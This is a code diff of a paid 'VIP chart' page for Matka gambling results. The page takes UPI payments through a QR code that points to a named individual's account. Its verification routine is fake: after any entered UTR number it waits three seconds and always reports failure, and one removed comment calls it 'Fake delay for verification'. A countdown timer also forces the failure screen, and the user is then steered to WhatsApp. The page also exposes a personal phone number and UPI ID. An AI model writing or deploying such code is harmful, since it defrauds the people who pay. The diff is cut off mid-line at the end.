@@ -15,41 +15,42 @@
 
         body { background: var(--gold-bg); color: var(--dark-blue); font-family: 'Roboto', Arial, sans-serif; text-align: center; margin: 0; padding: 0; scroll-behavior: smooth; }
         
-        /* Header & Navigation */
         .header { background: var(--gold-bg); padding: 20px; border-bottom: 5px solid #fff; position: sticky; top: 0; z-index: 1000; }
         .header h1 { margin: 0; font-size: 24px; color: var(--red); font-style: italic; font-weight: 900; text-transform: uppercase; }
         
         .intro-text { background: var(--yellow-accent); padding: 15px; margin: 15px auto; width: 90%; border: 3px solid #fff; font-size: 13px; color: var(--dark-blue); font-weight: bold; border-radius: 15px; }
         
-        .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; }
+        .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; display: inline-block; text-decoration: none;}
 
-        /* Chart Area */
-        #chartArea { background: #fff; width: 95%; margin: 10px auto; border: 2px solid var(--grid-border); border-radius: 8px; overflow: hidden; }
-        .chart-grid { display: grid; grid-template-columns: 45px repeat(6, 1fr); width: 100%; }
-        .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 9px; padding: 10px 0; border: 0.5px solid var(--grid-border); }
-        .date-box { background: #f2f2f2; font-size: 8px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; min-height: 55px; }
-        .cell { position: relative; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; min-height: 55px; }
-        .panna { display: flex; flex-direction: column; font-size: 8px; color: #555; position: absolute; line-height: 1; font-weight: bold; width: 10px; text-align: center; }
+        /* Chart Styles - Fixed Display */
+        #chartArea { background: #fff; width: 98%; margin: 10px auto; border: 1px solid var(--grid-border); overflow: hidden; }
+        .chart-grid { display: grid; grid-template-columns: 50px repeat(6, 1fr); width: 100%; background: #fff; }
+        .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 10px; padding: 10px 0; border: 0.5px solid var(--grid-border); }
+        
+        .date-box { background: #f2f2f2; font-size: 9px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; height: 65px; color: #000; }
+        .cell { position: relative; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; height: 65px; }
+        
+        .panna { display: flex; flex-direction: column; font-size: 9px; color: #555; position: absolute; line-height: 1.1; font-weight: bold; width: 12px; text-align: center; }
         .panna.left { left: 2px; } .panna.right { right: 2px; }
-        .jodi { font-size: 18px; font-weight: bold; color: #000; }
+        .panna span { display: block; }
+        .jodi { font-size: 20px; font-weight: bold; color: #000; }
         .red-house .jodi, .red-house .panna { color: var(--red) !important; }
-        .single-vip-lock { color: #f70031; font-size: 20px; animation: blink 1.5s infinite; }
+        .single-vip-lock { color: #f70031; font-size: 22px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.4; } }
 
-        /* Payment UI */
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; overflow-y: auto; }
-        .modal-content { background: #fff; width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; color: #333; position: relative; }
-        .plan-box { border: 2px solid var(--dark-blue); margin: 10px 0; padding: 12px; border-radius: 10px; cursor: pointer; font-weight: bold; background: var(--yellow-accent); }
+        /* Payment Modal */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; }
+        .modal-content { background: #fff; width: 85%; max-width: 380px; padding: 20px; border-radius: 20px; color: #333; }
+        .plan-box { border: 2px solid var(--dark-blue); margin: 10px 0; padding: 12px; border-radius: 10px; cursor: pointer; font-weight: bold; background: var(--yellow-accent); color: var(--dark-blue); }
         
-        #timer { font-size: 20px; font-weight: bold; color: var(--red); margin: 10px 0; }
-        .qr-img { width: 200px; height: 200px; margin: 10px auto; border: 5px solid var(--yellow-accent); }
-        input { width: 80%; padding: 12px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 16px; }
-        .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        #timer { font-size: 22px; font-weight: bold; color: var(--red); margin: 10px 0; }
+        .qr-img { width: 180px; height: 180px; margin: 10px auto; border: 4px solid var(--yellow-accent); }
+        input { width: 85%; padding: 12px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 16px; }
+        .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 90%; }
         
-        .failed-box { color: var(--red); font-weight: bold; padding: 20px; }
+        .failed-box { color: var(--red); font-weight: bold; }
 
-        /* Disclaimer */
-        .disclaimer { width: 90%; margin: 20px auto; padding: 15px; background: rgba(255,255,255,0.5); border-radius: 10px; font-size: 11px; color: #444; text-align: justify; line-height: 1.4; border: 1px dashed var(--dark-blue); }
+        .disclaimer { width: 90%; margin: 20px auto; padding: 15px; background: #fff; border-radius: 10px; font-size: 11px; color: #444; text-align: justify; border: 1px dashed var(--dark-blue); }
     </style>
 </head>
 <body>
@@ -58,7 +59,7 @@
 
 <div class="intro-text">
     <strong>BOMBAY SPECIAL VIP CHART</strong><br>
-    Get precise Jodi and Panna results instantly.
+    Unlock VIP for Exclusive access to Today's Result.
 </div>
 
 <button class="scroll-btn" onclick="document.getElementById('unlockArea').scrollIntoView({behavior: 'smooth'});">Go to Bottom</button>
@@ -68,22 +69,23 @@
         <div class="date-label">DATE</div>
         <div class="day-label">MON</div><div class="day-label">TUE</div><div class="day-label">WED</div>
         <div class="day-label">THU</div><div class="day-label">FRI</div><div class="day-label">SAT</div>
-        <div id="gridData" style="display:contents;"></div>
+        <div id="gridData" style="display:contents;">
+            </div>
     </div>
 </div>
 
 <div id="unlockArea">
-    <button class="scroll-btn" style="background:#4fb5f5; width:80%; font-size:18px;" onclick="openVipModal()">Remove Lock 🔑</button>
+    <button class="scroll-btn" style="background:#4fb5f5; width:85%; font-size:18px; margin-top: 20px;" onclick="openVipModal()">Remove Lock 🔑</button>
 </div>
 
 <button class="scroll-btn" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">Go to Top</button>
 
 <div class="disclaimer">
-    <strong>DISCLAIMER:</strong> This website is for informational purposes only. We do not promote or encourage any illegal activities. All information provided here is based on numerical calculations and historical data. Users are advised to use this information at their own risk. We are not responsible for any financial losses. Playing such games may be addictive or prohibited in some regions; please check your local laws.
+    <strong>DISCLAIMER:</strong> This website is for educational and informational purposes only. We do not promote gambling or any illegal activities. All data is based on historical patterns. Use this information at your own risk. We are not responsible for any financial loss or damage. 
 </div>
 
 <div id="vipModal" class="overlay">
-    <div class="modal-content" id="modalContent">
+    <div class="modal-content">
         <div id="stepPlan">
             <h2 style="color:var(--dark-blue)">Select VIP Plan</h2>
             <div class="plan-box" onclick="showPayment(599, '1 Day')">1 Day - ₹599</div>
@@ -93,21 +95,19 @@
         </div>
 
         <div id="stepPay" style="display:none;">
-            <h3 id="payTitle" style="margin:5px;"></h3>
+            <h3 id="payTitle"></h3>
             <div id="timer">02:00</div>
-            <p><strong>Name: Omkar Yadav</strong></p>
-            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img" alt="QR Code">
-            <p style="font-size:12px; color:gray;">Scan QR and Pay Amount</p>
-            <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR / Ref No.">
-            <br>
+            <p style="margin:2px;"><strong>Omkar Yadav</strong></p>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img">
+            <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
             <button class="verify-btn" onclick="startVerification()">VERIFY PAYMENT</button>
         </div>
 
         <div id="stepFailed" style="display:none;" class="failed-box">
             <h2 style="font-size:40px;">⚠️</h2>
             <h3>Verification Failed!</h3>
-            <p>आपका पेमेंट वेरिफाई नहीं हो पाया है। कृपया स्क्रीनशॉट WhatsApp पर भेजें।</p>
-            <button class="scroll-btn" onclick="sendToWhatsapp()">CHECK STATUS ON WHATSAPP</button>
+            <p>पेमेंट वेरिफाई नहीं हुआ। हेल्प के लिए संपर्क करें।</p>
+            <button class="scroll-btn" onclick="sendToWhatsapp()" style="background:#25D366; color:white;">WHATSAPP SUPPORT</button>
         </div>
     </div>
 </div>
@@ -117,26 +117,21 @@
     let timerId = null;
     let selectedAmount = 0;
 
-    function openVipModal() { 
-        document.getElementById('vipModal').style.display = 'flex';
-        resetSteps();
-    }
+    function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; resetSteps(); }
+    function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; clearInterval(timerId); }
 
     function resetSteps() {
         document.getElementById('stepPlan').style.display = 'block';
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'none';
-        clearInterval(timerId);
         timeLeft = 120;
     }
-
-    function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; clearInterval(timerId); }
 
     function showPayment(amt, plan) {
         selectedAmount = amt;
         document.getElementById('stepPlan').style.display = 'none';
         document.getElementById('stepPay').style.display = 'block';
-        document.getElementById('payTitle').innerText = plan + " - Pay ₹" + amt;
+        document.getElementById('payTitle').innerText = plan + " VIP";
         startTimer();
     }
 
@@ -146,51 +141,24 @@
             let mins = Math.floor(timeLeft / 60);
             let secs = timeLeft % 60;
             document.getElementById('timer').innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            if (timeLeft <= 0) {
-                clearInterval(timerId);
-                showFailed();
-            }
+            if (timeLeft <= 0) { clearInterval(timerId); showFailed(); }
         }, 1000);
     }
 
     function startVerification() {
         let utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) { alert("Please enter valid UTR No."); return; }
-        // Fake delay for verification
-        document.querySelector('.verify-btn').innerText = "Verifying...";
+        if(utr.length < 10) { alert("Enter UTR No."); return; }
+        document.querySelector('.verify-btn').innerText = "Processing...";
         setTimeout(showFailed, 3000);
     }
 
     function showFailed() {
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'block';
+        clearInterval(timerId);
     }
 
     function sendToWhatsapp() {
         let utr = document.getElementById('utrInput').value;
-        let msg = `Bhai maine ₹${selectedAmount} pay kar diya hai. UTR: ${utr}. Please mera VIP chart unlock kardo.`;
-        window.open(`https://wa.me/918103982813?text=${encodeURIComponent(msg)}`, '_blank');
-    }
-
-    // Chart Loading Logic
-    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
-    async function loadChart() {
-        try {
-            const res = await fetch(CSV_URL + "&t=" + new Date().getTime());
-            const data = await res.text();
-            const rows = data.split('\n').map(r => r.split(','));
-            let h = ''; let lockPlaced = false;
-            for(let i=1; i<rows.length; i++) {
-                if(!rows[i][0] || rows[i][0].trim() === "") continue;
-                h += `<div class="date-box">${rows[i][0].replace(/"/g,"")}</div>`;
-                for(let j=1; j<=16; j+=3) {
-                    let l = (rows[i][j]||"").trim().replace(/"/g,"");
-                    let jo = (rows[i][j+1]||"").trim().replace(/"/g,"");
-                    let r = (rows[i][j+2]||"").trim().replace(/"/g,"");
-                    if(!l && !jo && !r) {
-                        if(!lockPlaced) { h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; lockPlaced=true; }
-                        else { h += `<div class="cell"></div>`; }
-                    } else {
-                        let isRed = (jo.length>=2 && (jo[0]===jo[1] || Math.abs(jo[0]-jo[1])===5)) || jo.includes('*');
-                        let lh = l.split('').map(s=>`<span>${s}</span>`).join('');
-                        let rh = r.split('').map
+        let msg = `Bhai maine ₹${selectedAmount} pay kiya hai. UTR: ${utr}. Unlock my VIP.`;
+        window.open(`https://wa.me/918103982813?
